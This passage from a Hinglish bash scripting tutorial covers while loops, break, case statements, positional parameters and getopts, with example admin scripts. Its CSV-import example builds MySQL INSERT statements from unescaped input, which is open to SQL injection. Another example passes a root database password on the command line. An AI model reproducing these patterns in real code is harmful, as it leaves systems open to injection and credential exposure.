                    echo "✗ Restart failed. Sending alert..."
                    echo "$service failed on $(hostname)" | mail -s "Service Alert" admin@example.com
                fi
            fi
        fi
        
        sleep $check_interval
    done
}

# Log file processor
process_logs() {
    local log_file=$1
    local error_count=0
    local warning_count=0
    
    while IFS= read -r line; do
        # Skip empty lines
        [[ -z $line ]] && continue
        
        # Count errors
        if [[ $line == *ERROR* ]]; then
            ((error_count++))
            echo "ERROR: $line"
        fi
        
        # Count warnings
        if [[ $line == *WARN* ]]; then
            ((warning_count++))
        fi
        
    done < "$log_file"
    
    echo ""
    echo "Summary:"
    echo "  Errors: $error_count"
    echo "  Warnings: $warning_count"
}

# Interactive menu
show_menu() {
    while true; do
        clear
        echo "=== System Menu ==="
        echo "1. Check disk space"
        echo "2. Check memory"
        echo "3. List processes"
        echo "4. Exit"
        echo "==================="
        
        read -p "Enter choice [1-4]: " choice
        
        case $choice in
            1)
                df -h
                read -p "Press Enter to continue..."
                ;;
            2)
                free -h
                read -p "Press Enter to continue..."
                ;;
            3)
                ps aux | head -20
                read -p "Press Enter to continue..."
                ;;
            4)
                echo "Goodbye!"
                break
                ;;
            *)
                echo "Invalid choice"
                sleep 2
                ;;
        esac
    done
}

# Wait for file
wait_for_file() {
    local file=$1
    local timeout=${2:-60}
    local elapsed=0
    
    echo "Waiting for file: $file"
    
    while [ ! -f "$file" ]; do
        if [ $elapsed -ge $timeout ]; then
            echo "✗ Timeout waiting for file"
            return 1
        fi
        
        echo "  Waiting... ($elapsed/$timeout seconds)"
        sleep 5
        ((elapsed += 5))
    done
    
    echo "✓ File found: $file"
    return 0
}

show_menu
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Infinite loops:** Condition kabhi false nahi hoti
- ❌ **File reading galat:** `while read line` ki jagah `while IFS= read -r line`
- ❌ **Counter update bhoolna:** Loop kabhi end nahi hoga

### 10. **Best Practices / Pro Tips**
- 💡 **`IFS= read -r`:** File reading ke liye proper syntax
- 💡 **Break condition:** Hamesha exit strategy rakho
- 💡 **Sleep use karo:** Monitoring loops mein
- 💡 **Timeout implement:** Infinite wait avoid karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Database connection retry

connect_database() {
    local host=$1
    local max_retries=5
    local retry_delay=3
    local attempt=1
    
    echo "Connecting to database: $host"
    
    while [ $attempt -le $max_retries ]; do
        echo "Attempt $attempt/$max_retries..."
        
        if mysql -h "$host" -u root -p"$DB_PASS" -e "SELECT 1" &>/dev/null; then
            echo "✓ Connected successfully"
            return 0
        else
            echo "✗ Connection failed"
            
            if [ $attempt -lt $max_retries ]; then
                echo "Retrying in $retry_delay seconds..."
                sleep $retry_delay
            fi
        fi
        
        ((attempt++))
    done
    
    echo "✗ Failed to connect after $max_retries attempts"
    return 1
}

# CSV file processor
process_csv() {
    local csv_file=$1
    local line_num=0
    local processed=0
    local errors=0
    
    while IFS=',' read -r id name email status; do
        ((line_num++))
        
        # Skip header
        [ $line_num -eq 1 ] && continue
        
        # Validate data
        if [[ -z $id || -z $email ]]; then
            echo "Line $line_num: Missing required fields"
            ((errors++))
            continue
        fi
        
        # Process record
        echo "Processing: $name ($email)"
        
        # Insert into database
        if mysql -e "INSERT INTO users VALUES ('$id', '$name', '$email', '$status')"; then
            ((processed++))
        else
            ((errors++))
        fi
        
    done < "$csv_file"
    
    echo ""
    echo "Processing complete:"
    echo "  Total lines: $line_num"
    echo "  Processed: $processed"
    echo "  Errors: $errors"
}

connect_database "localhost"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `while [ condition ]; do ... done`
- ✅ Condition-based iteration
- ✅ `while IFS= read -r line` file reading
- ✅ `while true` infinite loop
- ✅ Break condition zaroori

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `while` aur `until` mein kya fark hai?**
A: `while` jab tak true, `until` jab tak false. Opposite logic.

**Q2: File reading mein `IFS=` kyun?**
A: Leading/trailing whitespace preserve karne ke liye.

**Q3: Infinite loop se kaise nikalu?**
A: `break` statement ya Ctrl+C.

### 14. **Practice ke liye Task**

```bash
# 1. Basic counter
count=1
while [ $count -le 5 ]; do
    echo "Count: $count"
    ((count++))
done

# 2. User input
while true; do
    read -p "Enter 'quit' to exit: " input
    [[ $input == "quit" ]] && break
    echo "You entered: $input"
done

# 3. File reading
while IFS= read -r line; do
    echo "Line: $line"
done < /etc/passwd

# 4. Until loop
num=1
until [ $num -gt 5 ]; do
    echo "Number: $num"
    ((num++))
done

# 5. Monitoring
while true; do
    clear
    date
    uptime
    sleep 5
done
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔁 Condition true tak repeat
- 📄 File reading: `while IFS= read -r line`
- ♾️ `while true` infinite loop
- 🚪 `break` se exit karo
- ⏱️ Monitoring ke liye perfect

> **💡 Ye Zaroor Yaad Rakhein:**
> While loops condition-based iterations ke liye perfect hain! File reading mein `IFS= read -r` use karo, infinite loops mein break condition rakho!

---

## **Topic 4: `break` Statement**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**break Statement** - Loop se turant bahar nikalna.

### 2. **Ye Kya Hai? (What is it?)**
`break` statement loop ko immediately terminate kar deta hai - chahe condition true ho ya false. Yeh early exit ke liye use hota hai jab koi specific condition mil jaye.

**Analogy:** Socho ki aap ek maze mein hain. Break ek emergency exit hai jo aapko directly bahar le jaata hai, bina poora maze complete kiye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Early exit** - Unnecessary iterations avoid
- ✅ **Efficiency** - Time save karna
- ✅ **Search operations** - Found hone par stop
- ✅ **Error handling** - Critical error par exit

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Search operations mein
- Validation fail hone par
- User input "quit" kare
- Error conditions

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Unnecessary iterations
- Performance waste
- Complex exit logic
- Code verbose

### 6. **Syntax aur Common Options**

```bash
# Basic break
while condition; do
    if [ some_condition ]; then
        break
    fi
done

# Break from nested loops
for i in {1..10}; do
    for j in {1..10}; do
        if [ condition ]; then
            break 2  # Break 2 levels
        fi
    done
done

# Break with status
break  # Exit innermost loop
```

### 7. **Example 1 (Basic)**

```bash
# Search in array
names=("Alice" "Bob" "Charlie" "David")
search="Charlie"

for name in "${names[@]}"; do
    if [[ $name == $search ]]; then
        echo "Found: $name"
        break
    fi
done

# User input
while true; do
    read -p "Enter command (quit to exit): " cmd
    
    if [[ $cmd == "quit" ]]; then
        echo "Exiting..."
        break
    fi
    
    echo "You entered: $cmd"
done

# File search
while IFS= read -r line; do
    if [[ $line == *ERROR* ]]; then
        echo "Error found: $line"
        break
    fi
done < logfile.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced break usage

# Find first available port
find_free_port() {
    local start_port=8000
    local end_port=9000
    
    echo "Searching for free port..."
    
    for (( port=start_port; port<=end_port; port++ )); do
        if ! nc -z localhost $port 2>/dev/null; then
            echo "✓ Found free port: $port"
            return $port
        fi
        
        # Stop after checking 100 ports
        if (( port - start_port >= 100 )); then
            echo "⚠️  Checked 100 ports, stopping search"
            break
        fi
    done
    
    echo "✗ No free port found"
    return 1
}

# Process files until error
process_batch() {
    local files=("$@")
    local processed=0
    
    for file in "${files[@]}"; do
        echo "Processing: $file"
        
        if [[ ! -f $file ]]; then
            echo "✗ File not found: $file"
            echo "Stopping batch processing"
            break
        fi
        
        if ! process_file "$file"; then
            echo "✗ Processing failed: $file"
            echo "Stopping batch processing"
            break
        fi
        
        ((processed++))
    done
    
    echo "Processed $processed files"
}

# Nested loop with break
find_in_matrix() {
    local target=$1
    local found=false
    
    for (( i=0; i<10; i++ )); do
        for (( j=0; j<10; j++ )); do
            value=$((i * 10 + j))
            
            if [ $value -eq $target ]; then
                echo "Found $target at position [$i,$j]"
                found=true
                break 2  # Break both loops
            fi
        done
    done
    
    if [ "$found" = false ]; then
        echo "Value $target not found"
    fi
}

# Retry with break
retry_operation() {
    local max_attempts=5
    local attempt=1
    
    while [ $attempt -le $max_attempts ]; do
        echo "Attempt $attempt/$max_attempts"
        
        if perform_operation; then
            echo "✓ Operation successful"
            break
        fi
        
        if [ $attempt -eq $max_attempts ]; then
            echo "✗ All attempts failed"
            return 1
        fi
        
        echo "Retrying..."
        sleep 2
        ((attempt++))
    done
    
    return 0
}

find_in_matrix 42
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`break` outside loop:** Error dega
- ❌ **Nested loops:** `break` sirf innermost se nikalta hai
- ❌ **Overuse:** Har jagah break mat use karo

### 10. **Best Practices / Pro Tips**
- 💡 **Early exit:** Jaldi mil gaya toh break karo
- 💡 **`break N`:** N levels break karne ke liye
- 💡 **Clear conditions:** Break condition clear rakho
- 💡 **Cleanup:** Break se pehle cleanup karo if needed

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Server health check with break

check_servers() {
    local servers=("web1" "web2" "web3" "db1" "db2")
    local critical_failure=false
    
    for server in "${servers[@]}"; do
        echo "Checking: $server"
        
        if ! ping -c 1 "$server" &>/dev/null; then
            echo "✗ $server is unreachable"
            
            # Check if critical server
            if [[ $server == db* ]]; then
                echo "⚠️  CRITICAL: Database server down!"
                critical_failure=true
                break  # Stop checking, alert immediately
            fi
        else
            echo "✓ $server is up"
        fi
    done
    
    if [ "$critical_failure" = true ]; then
        echo "Sending critical alert..."
        echo "Database server down!" | mail -s "CRITICAL ALERT" admin@example.com
        return 1
    fi
    
    return 0
}

# Configuration validator
validate_config() {
    local config_file=$1
    local errors=0
    
    while IFS='=' read -r key value; do
        [[ -z $key || $key == \#* ]] && continue
        
        # Check required fields
        case "$key" in
            "DB_HOST"|"DB_NAME"|"DB_USER")
                if [[ -z $value ]]; then
                    echo "✗ Missing required field: $key"
                    ((errors++))
                    
                    if [ $errors -ge 3 ]; then
                        echo "Too many errors, stopping validation"
                        break
                    fi
                fi
                ;;
        esac
    done < "$config_file"
    
    return $errors
}

check_servers
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `break` loop se exit karta hai
- ✅ Early exit ke liye useful
- ✅ `break N` nested loops ke liye
- ✅ Search operations mein efficient
- ✅ Error handling mein helpful

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `break` aur `exit` mein kya fark hai?**
A: `break` loop se nikalta hai, `exit` poori script terminate karta hai.

**Q2: Nested loops se kaise nikalu?**
A: `break 2` (2 levels), `break 3` (3 levels), etc.

**Q3: `break` ke baad code execute hota hai?**
A: Loop ke baad ka code execute hota hai, loop ke andar ka nahi.

### 14. **Practice ke liye Task**

```bash
# 1. Simple break
for i in {1..10}; do
    echo $i
    [[ $i -eq 5 ]] && break
done

# 2. Search with break
for name in Alice Bob Charlie; do
    if [[ $name == "Bob" ]]; then
        echo "Found: $name"
        break
    fi
done

# 3. User input
while true; do
    read -p "Enter (q to quit): " input
    [[ $input == "q" ]] && break
    echo "You entered: $input"
done

# 4. Nested loops
for i in {1..5}; do
    for j in {1..5}; do
        echo "[$i,$j]"
        [[ $i -eq 3 && $j -eq 3 ]] && break 2
    done
done
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🚪 Loop se immediately exit
- 🎯 Early exit ke liye efficient
- 🔢 `break N` nested loops ke liye
- 🔍 Search operations perfect
- ⚠️ Cleanup before break if needed

> **💡 Ye Zaroor Yaad Rakhein:**
> Break statement efficiency ka tool hai! Jaldi mil gaya toh break karo, unnecessary iterations avoid karo. Nested loops ke liye `break N` use karo!

---

## **Topic 5: `case` Statement (Menu-driven logic)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**case Statement** - Multiple conditions ko elegantly handle karna.

### 2. **Ye Kya Hai? (What is it?)**
`case` statement ek variable ko multiple values ke against match karta hai - jaise switch statement programming languages mein. Yeh multiple if-elif chains ka clean alternative hai.

**Analogy:** Socho ki case statement ek sorting machine hai jo items ko unke type ke hisaab se alag-alag bins mein dalta hai - ek glance mein pata chal jaata hai kahan jaana hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Readability** - Clean aur organized code
- ✅ **Menu systems** - Interactive scripts
- ✅ **Pattern matching** - Wildcards support
- ✅ **Efficiency** - Multiple if-elif se better

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Menu-driven scripts
- File type detection
- Command-line argument parsing
- Multiple fixed options

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Long if-elif chains (messy)
- Code duplication
- Poor readability
- Maintenance mushkil

### 6. **Syntax aur Common Options**

```bash
case $variable in
    pattern1)
        commands
        ;;
    pattern2)
        commands
        ;;
    pattern3|pattern4)
        commands
        ;;
    *)
        default commands
        ;;
esac
```

**Pattern Matching:**
- `*` : Any string
- `?` : Any single character
- `[...]` : Character class
- `|` : OR (multiple patterns)

### 7. **Example 1 (Basic)**

```bash
# Simple menu
read -p "Enter choice (a/b/c): " choice

case $choice in
    a)
        echo "You chose A"
        ;;
    b)
        echo "You chose B"
        ;;
    c)
        echo "You chose C"
        ;;
    *)
        echo "Invalid choice"
        ;;
esac

# File type detection
file="document.txt"

case $file in
    *.txt)
        echo "Text file"
        ;;
    *.jpg|*.png|*.gif)
        echo "Image file"
        ;;
    *.sh)
        echo "Shell script"
        ;;
    *)
        echo "Unknown type"
        ;;
esac

# Yes/No prompt
read -p "Continue? (y/n): " answer

case $answer in
    y|Y|yes|Yes|YES)
        echo "Continuing..."
        ;;
    n|N|no|No|NO)
        echo "Stopping..."
        exit 0
        ;;
    *)
        echo "Invalid input"
        ;;
esac
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System management menu

show_menu() {
    clear
    cat << 'EOF'
╔════════════════════════════════╗
║   SYSTEM MANAGEMENT MENU       ║
╚════════════════════════════════╝

1. System Information
2. Disk Usage
3. Memory Usage
4. Network Status
5. Process Management
6. Service Control
7. Backup Operations
8. Exit

EOF
}

system_info() {
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "Kernel: $(uname -r)"
    echo "Uptime: $(uptime -p)"
    echo "Users: $(who | wc -l)"
}

disk_usage() {
    echo "=== Disk Usage ==="
    df -h | grep -v "tmpfs"
}

memory_usage() {
    echo "=== Memory Usage ==="
    free -h
}

network_status() {
    echo "=== Network Status ==="
    ip addr show | grep "inet "
    echo ""
    echo "Active connections:"
    ss -tuln | head -10
}

process_menu() {
    echo "Process Management:"
    echo "1. Top processes"
    echo "2. Kill process"
    echo "3. Back"
    
    read -p "Choice: " pchoice
    
    case $pchoice in
        1)
            ps aux --sort=-%mem | head -20
            ;;
        2)
            read -p "Enter PID: " pid
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" && echo "Process killed"
            else
                echo "Invalid PID"
            fi
            ;;
        3)
            return
            ;;
    esac
}

service_control() {
    echo "Service Control:"
    echo "1. List services"
    echo "2. Start service"
    echo "3. Stop service"
    echo "4. Restart service"
    
    read -p "Choice: " schoice
    
    case $schoice in
        1)
            systemctl list-units --type=service --state=running
            ;;
        2|3|4)
            read -p "Service name: " service
            
            case $schoice in
                2) systemctl start "$service" ;;
                3) systemctl stop "$service" ;;
                4) systemctl restart "$service" ;;
            esac
            
            systemctl status "$service"
            ;;
    esac
}

backup_operations() {
    echo "Backup Operations:"
    echo "1. Create backup"
    echo "2. List backups"
    echo "3. Restore backup"
    
    read -p "Choice: " bchoice
    
    case $bchoice in
        1)
            backup_file="/backups/backup_$(date +%Y%m%d_%H%M%S).tar.gz"
            tar -czf "$backup_file" /home
            echo "Backup created: $backup_file"
            ;;
        2)
            ls -lh /backups/*.tar.gz 2>/dev/null || echo "No backups found"
            ;;
        3)
            echo "Available backups:"
            ls /backups/*.tar.gz 2>/dev/null
            read -p "Enter backup file: " backup
            tar -xzf "$backup" -C /
            ;;
    esac
}

# Main loop
while true; do
    show_menu
    read -p "Enter choice [1-8]: " choice
    
    case $choice in
        1)
            system_info
            ;;
        2)
            disk_usage
            ;;
        3)
            memory_usage
            ;;
        4)
            network_status
            ;;
        5)
            process_menu
            ;;
        6)
            service_control
            ;;
        7)
            backup_operations
            ;;
        8)
            echo "Goodbye!"
            exit 0
            ;;
        *)
            echo "Invalid choice. Please enter 1-8."
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
done
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`;;` bhoolna:** Har case ko `;;` se close karo
- ❌ **`esac` bhoolna:** `case` ko `esac` se close karo
- ❌ **Default case nahi:** `*)` hamesha add karo

### 10. **Best Practices / Pro Tips**
- 💡 **Default case:** `*)` hamesha include karo
- 💡 **Multiple patterns:** `|` se combine karo
- 💡 **Wildcards:** Pattern matching powerful hai
- 💡 **Indentation:** Readable code ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Deployment script with environment selection

ENVIRONMENT=$1

case $ENVIRONMENT in
    dev|development)
        echo "Deploying to DEVELOPMENT"
        SERVER="dev.example.com"
        DB_NAME="myapp_dev"
        DEBUG=true
        ;;
        
    staging|stage)
        echo "Deploying to STAGING"
        SERVER="staging.example.com"
        DB_NAME="myapp_staging"
        DEBUG=true
        ;;
        
    prod|production)
        echo "Deploying to PRODUCTION"
        SERVER="prod.example.com"
        DB_NAME="myapp_prod"
        DEBUG=false
        
        # Extra confirmation for production
        read -p "Are you sure? (yes/no): " confirm
        case $confirm in
            yes)
                echo "Proceeding with production deployment..."
                ;;
            *)
                echo "Deployment cancelled"
                exit 0
                ;;
        esac
        ;;
        
    *)
        echo "Usage: $0 {dev|staging|prod}"
        echo ""
        echo "Environments:"
        echo "  dev        - Development environment"
        echo "  staging    - Staging environment"
        echo "  prod       - Production environment"
        exit 1
        ;;
esac

echo "Server: $SERVER"
echo "Database: $DB_NAME"
echo "Debug: $DEBUG"

# Deployment logic here
echo "Deploying application..."
scp -r ./dist/* "deploy@$SERVER:/var/www/app/"
ssh "deploy@$SERVER" "systemctl restart app"

echo "✓ Deployment complete"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `case $var in ... esac`
- ✅ Pattern matching support
- ✅ `|` multiple patterns ke liye
- ✅ `*)` default case
- ✅ `;;` har case ke end mein

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `case` aur `if-elif` mein kab kaunsa use karu?**
A: Fixed options ke liye `case`, complex conditions ke liye `if-elif`.

**Q2: Kya regex use kar sakte hain?**
A: Nahi, sirf shell wildcards (`*`, `?`, `[...]`).

**Q3: Multiple commands ek case mein?**
A: Haan, `;;` se pehle jitne chahiye.

### 14. **Practice ke liye Task**

```bash
# 1. Simple menu
read -p "Choice (1/2/3): " choice
case $choice in
    1) echo "Option 1" ;;
    2) echo "Option 2" ;;
    3) echo "Option 3" ;;
    *) echo "Invalid" ;;
esac

# 2. File type
file="test.txt"
case $file in
    *.txt) echo "Text" ;;
    *.jpg|*.png) echo "Image" ;;
    *) echo "Unknown" ;;
esac

# 3. Yes/No
read -p "Continue? (y/n): " ans
case $ans in
    y|Y) echo "Yes" ;;
    n|N) echo "No" ;;
    *) echo "Invalid" ;;
esac

# 4. Command handler
cmd=$1
case $cmd in
    start) echo "Starting..." ;;
    stop) echo "Stopping..." ;;
    restart) echo "Restarting..." ;;
    *) echo "Usage: $0 {start|stop|restart}" ;;
esac
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🎯 Multiple options elegantly handle
- 🔀 Pattern matching support
- 📋 Menu systems ke liye perfect
- ✨ Cleaner than if-elif chains
- 🎨 Readable aur maintainable

> **💡 Ye Zaroor Yaad Rakhein:**
> Case statements menu-driven scripts ka backbone hain! Pattern matching powerful hai, default case (`*`) hamesha add karo, aur `;;` mat bhoolna!

---

# **🎉 Module 8 Complete! 🎉**

Congratulations! Aapne **Module 8: Loops & Control** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **for Loop (List-based)** - `for i in list`
✅ **for Loop (C-style)** - `for (( i=1; i<=10; i++ ))`
✅ **while Loop** - `while [ condition ]`
✅ **break Statement** - Loop se exit
✅ **case Statement** - Menu-driven logic

## **Key Patterns:**

```bash
# List-based for
for item in "${array[@]}"; do
    echo "$item"
done

# C-style for
for (( i=1; i<=10; i++ )); do
    echo $i
done

# While loop
while [ condition ]; do
    commands
done

# File reading
while IFS= read -r line; do
    echo "$line"
done < file.txt

# Break
for i in {1..100}; do
    [[ $i -eq 50 ]] && break
done

# Case statement
case $var in
    pattern1) commands ;;
    pattern2) commands ;;
    *) default ;;
esac
```

## **Real-World Applications:**
- **Batch processing:** Multiple files
- **Monitoring:** Service health checks
- **Menus:** Interactive scripts
- **Automation:** Repetitive tasks
- **Data processing:** CSV, logs

## **Best Practices:**
- Use appropriate loop type
- Always quote variables
- Check file existence
- Implement break conditions
- Use case for menus

## **Next Steps:**
Ab aap ready hain **Module 9: Script Parameters & Expansion** ke liye - PART 3 shuru hoga!

---

**📝 Practice Reminder:**
Loops scripting ka powerhouse hain! Daily practice karo:
- Different loop types try karo
- File processing scripts banao
- Interactive menus implement karo
- Break conditions properly use karo

**🎯 Challenge:**
Ek complete system management menu banao jo:
1. Multiple options de (case statement)
2. Files process kare (for loop)
3. Services monitor kare (while loop)
4. Error par exit kare (break)
5. User-friendly ho

Yeh challenge Module 8 ke saare concepts use karega!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 9)**

---

## **PART 3: BUILDING REAL SCRIPTS**

---

# **Module 9: Script Parameters & Expansion**

---

## **Topic 1: Positional Parameters (`$1`, `$2`, ... `${10}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Positional Parameters** - Script ko command-line arguments pass karna.

### 2. **Ye Kya Hai? (What is it?)**
Positional parameters woh values hain jo script ko run karte waqt pass ki jaati hain. `$1` pehla argument, `$2` doosra, etc. `$0` script ka naam hota hai.

**Analogy:** Socho ki script ek function hai aur positional parameters uske arguments hain - jaise function ko values pass karte hain, waise hi script ko.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Flexibility** - Dynamic input
- ✅ **Reusability** - Same script, different inputs
- ✅ **Automation** - Command-line tools
- ✅ **Professional scripts** - Industry standard

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Script ko flexible banana ho
- User input chahiye
- Command-line tools banate waqt
- Automation scripts mein

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Hardcoded values (inflexible)
- Script reusable nahi hogi
- Professional tools nahi bana paoge
- Automation limited

### 6. **Syntax aur Common Options**

```bash
# Positional parameters
$0    # Script name
$1    # First argument
$2    # Second argument
${10} # 10th argument (braces needed for 10+)

# Special parameters
$#    # Number of arguments
$@    # All arguments (as separate)
$*    # All arguments (as single string)
$?    # Exit status of last command
$$    # Current process ID
$!    # PID of last background job
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash
# greeting.sh

echo "Script name: $0"
echo "First argument: $1"
echo "Second argument: $2"
echo "Total arguments: $#"
echo "All arguments: $@"

# Usage: ./greeting.sh Alice Bob
# Output:
# Script name: ./greeting.sh
# First argument: Alice
# Second argument: Bob
# Total arguments: 2
# All arguments: Alice Bob
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# backup.sh - Flexible backup script

SOURCE=$1
DEST=$2
DATE=$(date +%Y%m%d_%H%M%S)

# Validate arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <source> <destination>"
    echo "Example: $0 /home/user /backups"
    exit 1
fi

# Validate source
if [ ! -d "$SOURCE" ]; then
    echo "Error: Source directory not found: $SOURCE"
    exit 1
fi

# Create destination
mkdir -p "$DEST"

# Backup
BACKUP_FILE="$DEST/backup_${DATE}.tar.gz"
echo "Backing up $SOURCE to $BACKUP_FILE"

if tar -czf "$BACKUP_FILE" "$SOURCE" 2>/dev/null; then
    SIZE=$(du -h "$BACKUP_FILE" | cut -f1)
    echo "✓ Backup successful: $SIZE"
else
    echo "✗ Backup failed"
    exit 1
fi

# Optional: compression level
if [ -n "$3" ]; then
    echo "Compression level: $3"
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `$1` ki jagah `"$1"` safe
- ❌ **Validation nahi:** Arguments check karo
- ❌ **10+ arguments:** `$10` galat, `${10}` sahi

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha validate:** `$#` se count check karo
- 💡 **Quotes use karo:** `"$1"` safe hai
- 💡 **Usage function:** Help message banao
- 💡 **Meaningful names:** Variables mein store karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# deploy.sh - Deployment script

APP_NAME=$1
ENVIRONMENT=$2
VERSION=${3:-latest}

usage() {
    cat << EOF
Usage: $0 <app-name> <environment> [version]

Arguments:
  app-name      Application name
  environment   dev|staging|prod
  version       Version to deploy (default: latest)

Examples:
  $0 myapp dev
  $0 myapp prod v2.1.0
EOF
    exit 1
}

# Validate
[ $# -lt 2 ] && usage

case $ENVIRONMENT in
    dev|staging|prod)
        echo "Deploying $APP_NAME to $ENVIRONMENT (version: $VERSION)"
        ;;
    *)
        echo "Error: Invalid environment: $ENVIRONMENT"
        usage
        ;;
esac

# Deploy logic here
echo "✓ Deployment complete"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `$1, $2, $3` - Arguments
- ✅ `$0` - Script name
- ✅ `$#` - Argument count
- ✅ `$@` - All arguments
- ✅ Validate hamesha

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `$@` aur `$*` mein kya fark hai?**
A: `"$@"` har argument alag, `"$*"` sab ek string mein.

**Q2: 10+ arguments kaise access karu?**
A: Braces use karo: `${10}`, `${11}`, etc.

**Q3: Default value kaise set karu?**
A: `${1:-default}` syntax use karo.

### 14. **Practice ke liye Task**

```bash
#!/bin/bash
# test_args.sh

echo "Script: $0"
echo "Args: $#"
echo "First: $1"
echo "Second: $2"
echo "All: $@"

# Run: ./test_args.sh hello world
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📥 `$1, $2` command-line arguments
- 🔢 `$#` argument count
- 📋 `$@` all arguments
- ✅ Hamesha validate karo
- 💬 Quotes use karo: `"$1"`

> **💡 Ye Zaroor Yaad Rakhein:**
> Positional parameters scripts ko flexible banate hain! Hamesha validate karo (`$#`), quotes use karo (`"$1"`), aur usage function banao!

---

## **Topic 2: Professional Argument Parsing (`getopts`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**getopts** - Professional command-line options parsing.

### 2. **Ye Kya Hai? (What is it?)**
`getopts` ek built-in command hai jo Unix-style options (`-a`, `-b value`) parse karta hai. Yeh professional scripts ka standard hai.

**Analogy:** Socho ki getopts ek receptionist hai jo forms check karta hai - kaunse fields filled hain, kaunse required hain, kaunse optional.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Professional** - Industry standard
- ✅ **Flexible** - Options in any order
- ✅ **Error handling** - Invalid options detect
- ✅ **User-friendly** - `-h` for help

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Professional scripts
- Multiple options chahiye
- Optional parameters
- Command-line tools

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual parsing (error-prone)
- Inflexible scripts
- Poor user experience
- Non-standard tools

### 6. **Syntax aur Common Options**

```bash
while getopts "abc:d:" opt; do
    case $opt in
        a) # Flag without value ;;
        b) # Flag without value ;;
        c) # Option with value: $OPTARG ;;
        d) # Option with value: $OPTARG ;;
        \?) # Invalid option ;;
    esac
done

shift $((OPTIND-1))  # Remove processed options
```

**Format:**
- `a` - Flag (no value)
- `a:` - Option (requires value)
- `:abc:` - Leading `:` for silent errors

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

while getopts "hvf:" opt; do
    case $opt in
        h)
            echo "Usage: $0 [-h] [-v] [-f file]"
            exit 0
            ;;
        v)
            VERBOSE=true
            ;;
        f)
            FILE=$OPTARG
            ;;
        \?)
            echo "Invalid option: -$OPTARG"
            exit 1
            ;;
    esac
done

echo "Verbose: ${VERBOSE:-false}"
echo "File: ${FILE:-none}"
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# backup.sh - Professional backup script

usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
  -s SOURCE     Source directory (required)
  -d DEST       Destination directory (required)
  -c LEVEL      Compression level (1-9, default: 6)
  -e            Encrypt backup
  -v            Verbose output
  -h            Show this help

Examples:
  $0 -s /home -d /backups
  $0 -s /data -d /backups -c 9 -e -v
EOF
    exit 1
}

# Defaults
COMPRESSION=6
ENCRYPT=false
VERBOSE=false

# Parse options
while getopts "s:d:c:evh" opt; do
    case $opt in
        s) SOURCE=$OPTARG ;;
        d) DEST=$OPTARG ;;
        c) COMPRESSION=$OPTARG ;;
        e) ENCRYPT=true ;;
        v) VERBOSE=true ;;
        h) usage ;;
        \?)
            echo "Error: Invalid option -$OPTARG"
            usage
            ;;
        :)
            echo "Error: Option -$OPTARG requires argument"
            usage
            ;;
    esac
done

# Validate required
if [ -z "$SOURCE" ] || [ -z "$DEST" ]; then
    echo "Error: Source and destination required"
    usage
fi

# Validate compression
if [ "$COMPRESSION" -lt 1 ] || [ "$COMPRESSION" -gt 9 ]; then
    echo "Error: Compression must be 1-9"
    exit 1
fi

# Execute
[ "$VERBOSE" = true ] && echo "Source: $SOURCE"
[ "$VERBOSE" = true ] && echo "Dest: $DEST"
[ "$VERBOSE" = true ] && echo "Compression: $COMPRESSION"

BACKUP_FILE="$DEST/backup_$(date +%Y%m%d_%H%M%S).tar.gz"

if tar -czf "$BACKUP_FILE" "$SOURCE"; then
